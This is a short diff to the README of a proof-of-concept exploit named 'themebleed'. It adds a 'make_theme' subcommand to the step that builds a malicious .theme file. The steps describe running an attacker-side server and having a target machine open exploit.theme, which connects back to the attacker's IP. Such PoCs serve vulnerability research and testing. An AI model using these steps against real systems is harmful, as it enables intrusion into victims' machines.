@@ -123,7 +123,7 @@ To run the PoC you will need two machines, one attacker machine which will run t
 
 ## Repro Steps
 
-1. Create the `.theme` file by running: `themebleed.exe <attacker machine ip> exploit.theme`
+1. Create the `.theme` file by running: `themebleed.exe make_theme <attacker machine ip> exploit.theme`
 2.  On the attacker machine run: `themebleed.exe server`
 3. On the target machine open `exploit.theme`
 
